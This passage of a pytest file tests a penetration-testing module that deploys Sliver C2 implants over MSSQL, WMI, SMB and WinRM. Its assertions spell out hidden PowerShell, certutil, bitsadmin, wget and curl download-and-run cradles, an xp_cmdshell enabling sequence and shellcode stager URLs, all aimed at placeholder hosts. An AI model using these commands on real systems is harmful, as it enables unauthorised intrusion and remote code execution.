        with pytest.raises(ValueError, match="MSSQL handler assumes Windows target"):
            handler.get_remote_paths("linux", "implant")

    def test_upload_with_options_toggle(self, mock_context, mock_connection, tmp_path):
        """Test upload enables/disables xp_cmdshell via sp_configure."""
        from nxc.modules.sliver_exec import MSSQLHandler
        import tempfile

        module = Mock()
        handler = MSSQLHandler(module)

        def mock_query(sql):
            if "show advanced options" in sql.lower():
                return [{"value": 0}]
            elif "xp_cmdshell" in sql.lower():
                return [{"value": 0}]
            return []

        mock_connection.sql_query = mock_query
        mock_connection.conn.sql_query = Mock()

        mock_connection.execute = Mock(return_value="")

        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
        temp_file.write(b"implantdata")
        temp_file.close()

        try:
            handler.upload(mock_context, mock_connection, temp_file.name, "C:\\Users\\Public\\implant.exe")

            assert mock_connection.conn.sql_query.call_count >= 2
            mock_connection.execute.assert_called()

            mock_context.log.success.assert_called_with("MSSQL upload complete (chunked base64 via xp_cmdshell)")
        finally:
            import os

            os.unlink(temp_file.name)

    def test_upload_options_already_enabled(self, mock_context, mock_connection, tmp_path):
        """Test upload skips toggle when options already enabled."""
        from nxc.modules.sliver_exec import MSSQLHandler
        import tempfile

        module = Mock()
        handler = MSSQLHandler(module)

        def mock_query(sql):
            if "show advanced options" in sql.lower():
                return [{"value": 1}]
            elif "xp_cmdshell" in sql.lower():
                return [{"value": 1}]
            return []

        mock_connection.sql_query = mock_query
        mock_connection.conn.sql_query = Mock()
        mock_connection.execute = Mock(return_value="")

        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
        temp_file.write(b"implantdata")
        temp_file.close()

        try:
            handler.upload(mock_context, mock_connection, temp_file.name, "C:\\Users\\Public\\implant.exe")

            mock_context.log.success.assert_called_with("MSSQL upload complete (chunked base64 via xp_cmdshell)")
        finally:
            import os

            os.unlink(temp_file.name)

    def test_execute(self, mock_context, mock_connection):
        """Test execute uses WMI PowerShell encoded via base64."""
        from nxc.modules.sliver_exec import MSSQLHandler

        module = Mock()
        handler = MSSQLHandler(module)

        mock_connection.execute = Mock(return_value=True)

        handler.execute(mock_context, mock_connection, "C:\\Users\\Public\\implant.exe", "windows")

        mock_connection.execute.assert_called_once()
        args = mock_connection.execute.call_args
        assert "powershell -ExecutionPolicy Bypass -EncodedCommand" in args[0][0]
        mock_context.log.info.assert_called_with("Executed via MSSQL (WMI): C:\\Users\\Public\\implant.exe")

    def test_stage_execute_not_supported(self, mock_context, mock_connection):
        """Test stage_execute raises NotImplementedError."""
        from nxc.modules.sliver_exec import MSSQLHandler

        module = Mock()
        handler = MSSQLHandler(module)

        with pytest.raises(NotImplementedError, match="MSSQL staging requires xp_cmdshell shellcode exec"):
            handler.stage_execute(mock_context, mock_connection, "windows", b"stager_data")

        mock_context.log.fail.assert_called_with("Staging not supported on MSSQL")

    def test_get_cleanup_cmd(self, mock_context):
        """Test get_cleanup_cmd returns Windows del command."""
        from nxc.modules.sliver_exec import MSSQLHandler

        module = Mock()
        handler = MSSQLHandler(module)

        cmd = handler.get_cleanup_cmd("C:\\Users\\Public\\implant.exe", "windows")

        assert cmd == 'del /f /q "C:\\Users\\Public\\implant.exe"'


class TestGenerateSliverStager:
    """Test _generate_sliver_stager method for fileless shellcode staging."""

    def test_generate_sliver_stager_success_http(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test successful stager generation with HTTP stage URL."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb
        import unittest.mock

        # Configure module
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = "192.168.1.50"
        module_instance.shellcode_listener_port = 8080

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-shellcode-data-17MB"

        mock_saved_profile = Mock()
        mock_saved_profile.Name = "nxc_stage2_test1234"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_profile
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act
        result = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test-implant", "test-profile"
        )

        # Assert
        assert result is not None
        assert isinstance(result, bytes)
        assert len(result) > 0

        # Verify HTTP URL in bootstrap
        bootstrap_str = result.decode("utf-8")
        assert "http://192.168.1.50:8080/nxc_stage2_" in bootstrap_str

        # Verify logging
        mock_context.log.info.assert_any_call("Generating tiny HTTP bootstrap stager...")

        # Verify worker calls
        patch_get_worker.submit_task.assert_any_call("connect", mock_config_file)
        assert any(call[0][0] == "generate_shellcode" for call in patch_get_worker.submit_task.call_args_list)

    def test_generate_sliver_stager_success_https(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test successful stager generation with HTTPS stage URL."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module for HTTPS
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "https"
        module_instance.shellcode_listener_host = "192.168.1.50"
        module_instance.shellcode_listener_port = 8443

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-https-shellcode"

        mock_saved_profile = Mock()
        mock_saved_profile.Name = "nxc_stage2_https5678"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_profile
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act
        result = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test-implant-https", "test-profile-https"
        )

        # Assert
        assert result is not None
        bootstrap_str = result.decode("utf-8")
        assert "https://192.168.1.50:8443/nxc_stage2_" in bootstrap_str
        mock_context.log.info.assert_any_call("Generating tiny HTTP bootstrap stager...")

    def test_generate_sliver_stager_success_tcp(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test successful stager generation with TCP stage URL."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module for TCP
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "tcp"
        module_instance.shellcode_listener_host = "192.168.1.50"
        module_instance.shellcode_listener_port = 9999

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-tcp-shellcode"

        mock_saved_profile = Mock()
        mock_saved_profile.Name = "nxc_stage2_tcp9999"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_profile
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act
        result = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test-implant-tcp", "test-profile-tcp"
        )

        # Assert
        assert result is not None
        bootstrap_str = result.decode("utf-8")
        # TCP URLs use tcp:// format in the implementation
        assert "tcp://192.168.1.50:9999/nxc_stage2_" in bootstrap_str

    def test_generate_sliver_stager_shellcode_failure(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test handling of empty shellcode response."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None
        module_instance.shellcode_listener_port = None

        # Mock empty shellcode response
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = None  # Simulate missing File

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act & Assert
        with pytest.raises(Exception):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test-implant", "test-profile")

        mock_context.log.fail.assert_called()

    def test_generate_sliver_stager_shellcode_empty_data(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test handling of empty shellcode data (File exists but Data is empty)."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None
        module_instance.shellcode_listener_port = None

        # Mock empty shellcode data
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b""  # Empty data

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act & Assert
        with pytest.raises(ValueError, match="Stage 2 shellcode gen failed"):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test-implant", "test-profile")

        mock_context.log.fail.assert_called()

    def test_generate_sliver_stager_profile_save_failure(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test handling of profile save error."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None
        module_instance.shellcode_listener_port = None

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-shellcode-data"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                raise Exception("Profile save failed: disk full")
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act & Assert
        with pytest.raises(Exception, match="Profile save failed"):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test-implant", "test-profile")

        mock_context.log.fail.assert_called()

    def test_generate_sliver_stager_defaults_to_rhost(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test that stager uses RHOST when SHELLCODE_LISTENER_HOST is None."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module - no shellcode_listener_host set
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None  # Should default to rhost
        module_instance.shellcode_listener_port = None  # Should default to rport

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-shellcode-data"

        mock_saved_profile = Mock()
        mock_saved_profile.Name = "nxc_stage2_default"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_profile
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act
        result = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test-implant", "test-profile"
        )

        # Assert - should use rhost:rport in URL
        assert result is not None
        bootstrap_str = result.decode("utf-8")
        assert "http://10.10.15.100:443/nxc_stage2_" in bootstrap_str

    def test_generate_sliver_stager_stage_implant_build_failure(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        r"""Test handling of stage_implant_build failure."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Configure module
        module_instance.config_path = mock_config_file
        module_instance.rhost = "10.10.15.100"
        module_instance.rport = 443
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None
        module_instance.shellcode_listener_port = None

        # Mock worker responses
        mock_stage2_resp = Mock(spec=clientpb.Generate)
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2-shellcode-data"

        mock_saved_profile = Mock()
        mock_saved_profile.Name = "nxc_stage2_test"

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_profile
            elif method == "stage_implant_build":
                raise Exception("Failed to register stage on listener")
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        # Act & Assert
        with pytest.raises(Exception, match="Failed to register stage"):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test-implant", "test-profile")

        mock_context.log.fail.assert_called()


class TestBuildDownloadCradle:
    """Tests for _build_download_cradle method."""

    @pytest.fixture
    def module_with_download_tool(self, module_instance):
        """Fixture that sets up module with download_tool attribute."""
        module_instance.download_tool = "powershell"
        return module_instance

    # Windows PowerShell tests
    def test_windows_powershell_non_smb(self, module_with_download_tool):
        """Test PowerShell cradle for non-SMB protocols."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe", protocol="winrm"
        )
        assert "powershell -ep bypass -w hidden -c" in result
        assert "IWR 'http://10.0.0.1:8080/implant.exe'" in result
        assert "-OutFile $env:TEMP\\implant.exe" in result
        assert "Start-Process $env:TEMP\\implant.exe" in result
        assert not result.startswith("cmd /c")

    def test_windows_powershell_smb_has_cmd_wrapper(self, module_with_download_tool):
        """Test PowerShell cradle for SMB includes cmd /c wrapper."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe", protocol="smb"
        )
        assert result.startswith("cmd /c powershell")
        assert "IWR 'http://10.0.0.1:8080/implant.exe'" in result

    def test_windows_powershell_smb_uppercase(self, module_with_download_tool):
        """Test PowerShell cradle for SMB with uppercase protocol."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe", protocol="SMB"
        )
        assert result.startswith("cmd /c powershell")

    def test_windows_powershell_no_protocol(self, module_with_download_tool):
        """Test PowerShell cradle when protocol is None."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe", protocol=None
        )
        assert not result.startswith("cmd /c")
        assert "powershell -ep bypass" in result

    # Windows Certutil tests
    def test_windows_certutil(self, module_with_download_tool):
        """Test certutil cradle for Windows."""
        module_with_download_tool.download_tool = "certutil"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe"
        )
        assert "WMIC process call create" in result
        assert "certutil -urlcache -f http://10.0.0.1:8080/implant.exe" in result
        assert "%TEMP%\\implant.exe" in result

    def test_windows_certutil_different_url(self, module_with_download_tool):
        """Test certutil with different URL."""
        module_with_download_tool.download_tool = "certutil"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://192.168.1.100:9999/beacon.exe", "beacon.exe"
        )
        assert "http://192.168.1.100:9999/beacon.exe" in result
        assert "beacon.exe" in result

    # Windows BITSAdmin tests
    def test_windows_bitsadmin(self, module_with_download_tool):
        """Test bitsadmin cradle for Windows."""
        module_with_download_tool.download_tool = "bitsadmin"
        result = module_with_download_tool._build_download_cradle(
            "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe"
        )
        assert "WMIC process call create" in result
        assert "bitsadmin /transfer job /download /priority high" in result

    # Windows unsupported tool test
    def test_windows_unsupported_tool_raises(self, module_with_download_tool):
        """Test that unsupported Windows tool raises ValueError."""
        module_with_download_tool.download_tool = "invalidtool"
        with pytest.raises(ValueError, match="not supported for Windows"):
            module_with_download_tool._build_download_cradle(
                "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe"
            )

    def test_windows_unsupported_tool_message_contains_tool_name(self, module_with_download_tool):
        """Test error message contains the invalid tool name."""
        module_with_download_tool.download_tool = "netcat"
        with pytest.raises(ValueError) as exc_info:
            module_with_download_tool._build_download_cradle(
                "windows", "http://10.0.0.1:8080/implant.exe", "implant.exe"
            )
        assert "netcat" in str(exc_info.value)
        assert "powershell, certutil, or bitsadmin" in str(exc_info.value)

    # Linux wget tests
    def test_linux_wget(self, module_with_download_tool):
        """Test wget cradle for Linux."""
        module_with_download_tool.download_tool = "wget"
        result = module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "implant")
        assert "wget -q -O /tmp/implant http://10.0.0.1:8080/implant" in result
        assert "chmod +x /tmp/implant" in result
        assert "nohup /tmp/implant > /dev/null 2>&1 &" in result

    def test_linux_wget_different_name(self, module_with_download_tool):
        """Test wget with different implant name."""
        module_with_download_tool.download_tool = "wget"
        result = module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/beacon", "mybeacon")
        assert "/tmp/mybeacon" in result

    # Linux curl tests
    def test_linux_curl(self, module_with_download_tool):
        """Test curl cradle for Linux."""
        module_with_download_tool.download_tool = "curl"
        result = module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "implant")
        assert "curl -s -o /tmp/implant http://10.0.0.1:8080/implant" in result
        assert "chmod +x /tmp/implant" in result

    def test_linux_curl_https_url(self, module_with_download_tool):
        """Test curl with HTTPS URL."""
        module_with_download_tool.download_tool = "curl"
        result = module_with_download_tool._build_download_cradle(
            "linux", "https://secure.example.com/implant", "implant"
        )
        assert "https://secure.example.com/implant" in result

    # Linux python tests
    def test_linux_python(self, module_with_download_tool):
        """Test python cradle for Linux."""
        module_with_download_tool.download_tool = "python"
        result = module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "implant")
        assert "python3 -c" in result
        assert "import urllib.request" in result
        assert "urllib.request.urlretrieve" in result

    # Linux unsupported tool test
    def test_linux_unsupported_tool_raises(self, module_with_download_tool):
        """Test that unsupported Linux tool raises ValueError."""
        module_with_download_tool.download_tool = "powershell"
        with pytest.raises(ValueError, match="not supported for Linux"):
            module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "implant")

    def test_linux_unsupported_tool_message_contains_tool_name(self, module_with_download_tool):
        """Test error message contains the invalid tool name."""
        module_with_download_tool.download_tool = "certutil"
        with pytest.raises(ValueError) as exc_info:
            module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "implant")
        assert "certutil" in str(exc_info.value)
        assert "wget, curl, or python" in str(exc_info.value)

    # OS case sensitivity tests
    def test_windows_uppercase(self, module_with_download_tool):
        """Test Windows detection is case-insensitive."""
        module_with_download_tool.download_tool = "certutil"
        result = module_with_download_tool._build_download_cradle(
            "WINDOWS", "http://10.0.0.1:8080/implant.exe", "implant.exe"
        )
        assert "certutil" in result

    def test_linux_uppercase(self, module_with_download_tool):
        """Test Linux detection is case-insensitive."""
        module_with_download_tool.download_tool = "wget"
        result = module_with_download_tool._build_download_cradle("LINUX", "http://10.0.0.1:8080/implant", "implant")
        assert "wget" in result

    def test_windows_mixed_case(self, module_with_download_tool):
        """Test Windows detection with mixed case."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle(
            "WiNdOwS", "http://10.0.0.1:8080/implant.exe", "implant.exe"
        )
        assert "powershell" in result

    # Malformed input tests
    def test_none_os_type_raises_error(self, module_with_download_tool):
        """Test that None os_type raises AttributeError."""
        module_with_download_tool.download_tool = "powershell"
        with pytest.raises(AttributeError):
            module_with_download_tool._build_download_cradle(None, "http://10.0.0.1:8080/implant.exe", "implant.exe")

    def test_empty_string_os_type_raises_error(self, module_with_download_tool):
        """Test that empty string os_type results in incorrect behavior (not 'windows' or 'linux')."""
        module_with_download_tool.download_tool = "wget"
        # Empty string will pass .lower() check but won't match 'windows', so goes to Linux path
        result = module_with_download_tool._build_download_cradle("", "http://10.0.0.1:8080/implant", "implant")
        # Should execute Linux path since '' != 'windows'
        assert "wget" in result or "curl" in result

    def test_none_download_url_in_output(self, module_with_download_tool):
        """Test that None download_url is included literally in output string."""
        module_with_download_tool.download_tool = "powershell"
        result = module_with_download_tool._build_download_cradle("windows", None, "implant.exe")
        # None will be converted to string 'None' in f-string
        assert "None" in result

    def test_empty_implant_name_in_output(self, module_with_download_tool):
        """Test that empty implant_name is handled (creates path with just dir)."""
        module_with_download_tool.download_tool = "wget"
        result = module_with_download_tool._build_download_cradle("linux", "http://10.0.0.1:8080/implant", "")
        # Empty name should result in /tmp/ path
        assert "/tmp/" in result

    def test_unsupported_os_type_uses_linux_path(self, module_with_download_tool):
        """Test that unsupported OS type (not 'windows') uses Linux code path."""
        module_with_download_tool.download_tool = "wget"
        result = module_with_download_tool._build_download_cradle("macos", "http://10.0.0.1:8080/implant", "implant")
        # Should use Linux path since is_windows check will be False
        assert "wget" in result
        assert "/tmp/" in result


class TestBuildWmicCommand:
    """Tests for _build_wmic_command method."""

    def test_basic_command(self, module_instance):
        """Test basic WMIC command wrapping."""
        result = module_instance._build_wmic_command("echo hello")
        assert result == 'WMIC process call create "cmd /c echo hello"'

    def test_complex_command(self, module_instance):
        """Test WMIC with complex command."""
        inner = "certutil -urlcache -f http://x.com/a.exe %TEMP%\\a.exe && %TEMP%\\a.exe"
        result = module_instance._build_wmic_command(inner)
        assert "WMIC process call create" in result
        assert "cmd /c " in result
        assert inner in result

    def test_empty_command(self, module_instance):
        """Test WMIC with empty command."""
        result = module_instance._build_wmic_command("")
        assert result == 'WMIC process call create "cmd /c "'


class TestValidateRequiredOptions:
    """Tests for _validate_required_options to improve mutation kill rate."""

    @pytest.fixture
    def base_options(self):
        return {
            "RHOST": "10.0.0.1",
            "RPORT": "443",
            "WAIT": "30",
            "BEACON_INTERVAL": "5",
            "BEACON_JITTER": "3",
        }

    def test_rhost_none_raises(self, module_instance, mock_context, base_options):
        base_options["RHOST"] = None
        with pytest.raises(ModuleValidationError, match="Missing required option"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rhost_empty_string_raises(self, module_instance, mock_context, base_options):
        base_options["RHOST"] = ""
        with pytest.raises(ModuleValidationError, match="Invalid RHOST"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rhost_whitespace_raises(self, module_instance, mock_context, base_options):
        base_options["RHOST"] = "   "
        with pytest.raises(ModuleValidationError, match="Invalid RHOST"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rport_zero_raises(self, module_instance, mock_context, base_options):
        base_options["RPORT"] = "0"
        with pytest.raises(ModuleValidationError, match="Invalid RPORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rport_negative_raises(self, module_instance, mock_context, base_options):
        base_options["RPORT"] = "-1"
        with pytest.raises(ModuleValidationError, match="Invalid RPORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rport_too_high_raises(self, module_instance, mock_context, base_options):
        base_options["RPORT"] = "65536"
        with pytest.raises(ModuleValidationError, match="Invalid RPORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rport_at_max_valid(self, module_instance, mock_context, base_options, mock_config_file):
        base_options["RPORT"] = "65535"
        module_instance.config_path = mock_config_file
        module_instance._validate_required_options(mock_context, base_options)

    def test_rport_at_min_valid(self, module_instance, mock_context, base_options, mock_config_file):
        base_options["RPORT"] = "1"
        module_instance.config_path = mock_config_file
        module_instance._validate_required_options(mock_context, base_options)

    def test_beacon_interval_below_min_raises(self, module_instance, mock_context, base_options):
        base_options["BEACON_INTERVAL"] = "0"
        with pytest.raises(ModuleValidationError, match="Invalid BEACON_INTERVAL"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_beacon_interval_above_max_raises(self, module_instance, mock_context, base_options):
        base_options["BEACON_INTERVAL"] = "86401"
        with pytest.raises(ModuleValidationError, match="Invalid BEACON_INTERVAL"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_beacon_jitter_negative_raises(self, module_instance, mock_context, base_options):
        base_options["BEACON_JITTER"] = "-1"
        with pytest.raises(ModuleValidationError, match="Invalid BEACON_JITTER"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_wait_below_min_raises(self, module_instance, mock_context, base_options):
        base_options["WAIT"] = "0"
        with pytest.raises(ModuleValidationError, match="Invalid WAIT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_wait_above_max_raises(self, module_instance, mock_context, base_options):
        base_options["WAIT"] = "3601"
        with pytest.raises(ModuleValidationError, match="Invalid WAIT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_shellcode_staging_invalid_port_raises(self, module_instance, mock_context, base_options):
        base_options["STAGING"] = "shellcode"
        base_options["SHELLCODE_LISTENER_PORT"] = "0"
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_LISTENER_PORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_shellcode_staging_invalid_protocol_raises(self, module_instance, mock_context, base_options):
        base_options["STAGING"] = "shellcode"
        base_options["SHELLCODE_PROTOCOL"] = "ftp"
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_PROTOCOL"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_rhost_and_profile_both_provided(self, module_instance, mock_context, base_options, mock_config_file):
        """Test that when both RHOST and PROFILE are provided, validation passes (profile takes precedence)."""
        base_options["RHOST"] = "10.0.0.1"
        base_options["PROFILE"] = "test_profile"
        module_instance.config_path = mock_config_file
        # Should not raise - validation allows RHOST OR PROFILE (line 789)
        module_instance._validate_required_options(mock_context, base_options)

    def test_staging_shellcode_with_invalid_listener_port_combo(self, module_instance, mock_context, base_options):
        """Test STAGING=shellcode with SHELLCODE_LISTENER_PORT=0 raises Invalid SHELLCODE_LISTENER_PORT."""
        base_options["STAGING"] = "shellcode"
        base_options["SHELLCODE_LISTENER_PORT"] = "0"
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_LISTENER_PORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_staging_download_with_invalid_http_port_combo(self, module_instance, mock_context, base_options):
        """Test STAGING=download with HTTP_STAGING_PORT=99999 raises Invalid HTTP_STAGING_PORT."""
        base_options["STAGING"] = "download"
        base_options["HTTP_STAGING_PORT"] = "99999"
        with pytest.raises(ModuleValidationError, match="Invalid HTTP_STAGING_PORT"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_staging_shellcode_no_listener_host_defaults_to_rhost(
        self, module_instance, mock_context, base_options, mock_config_file
    ):
        """Test STAGING=shellcode without SHELLCODE_LISTENER_HOST validates successfully (defaults to RHOST in parsing)."""
        base_options["STAGING"] = "shellcode"
        base_options["SHELLCODE_LISTENER_PORT"] = "8080"
        base_options["RHOST"] = "10.0.0.5"
        module_instance.config_path = mock_config_file
        # Should not raise - SHELLCODE_LISTENER_HOST is optional, defaults to RHOST later
        module_instance._validate_required_options(mock_context, base_options)

    def test_multiple_invalid_options_raises_first_error(self, module_instance, mock_context, base_options):
        """Test that when multiple options are invalid, first error is raised (RHOST validated before RPORT)."""
        base_options["RHOST"] = "not-an-ip"
        base_options["RPORT"] = "999999"
        # Should raise Invalid RHOST (checked at line 810 before RPORT at line 822)
        with pytest.raises(ModuleValidationError, match="Invalid RHOST"):
            module_instance._validate_required_options(mock_context, base_options)

    def test_beacon_interval_exceeds_wait_time_valid(
        self, module_instance, mock_context, base_options, mock_config_file
    ):
        """Test that BEACON_INTERVAL > WAIT is valid (no cross-validation exists)."""
        base_options["BEACON_INTERVAL"] = "100"
        base_options["WAIT"] = "90"
        module_instance.config_path = mock_config_file
        # Should not raise - no validation checks BEACON_INTERVAL vs WAIT
        module_instance._validate_required_options(mock_context, base_options)


class TestParseModuleOptions:
    """Tests for _parse_module_options option parsing logic."""

    def test_rhost_rport_from_options(self, module_instance, mock_context):
        """Test RHOST and RPORT parsing from options."""
        mock_context.module_options = {"RHOST": "10.0.0.1", "RPORT": "8443"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.rhost == "10.0.0.1"
        assert module_instance.rport == 8443

    def test_rport_defaults_to_443_when_rhost_provided(self, module_instance, mock_context):
        """Test RPORT defaults to 443 when RHOST is provided but RPORT is not."""
        mock_context.module_options = {"RHOST": "10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.rhost == "10.0.0.1"
        assert module_instance.rport == 443

    def test_rport_none_when_no_rhost(self, module_instance, mock_context):
        """Test RPORT is None when RHOST is not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.rhost is None
        assert module_instance.rport is None

    def test_cleanup_mode_lowercase_delete(self, module_instance, mock_context):
        """Test CLEANUP_MODE converts to lowercase: DELETE -> delete."""
        mock_context.module_options = {"CLEANUP_MODE": "DELETE"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.cleanup_mode == "delete"

    def test_cleanup_mode_lowercase_manual(self, module_instance, mock_context):
        """Test CLEANUP_MODE converts to lowercase: MANUAL -> manual."""
        mock_context.module_options = {"CLEANUP_MODE": "MANUAL"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.cleanup_mode == "manual"

    def test_cleanup_mode_lowercase_none(self, module_instance, mock_context):
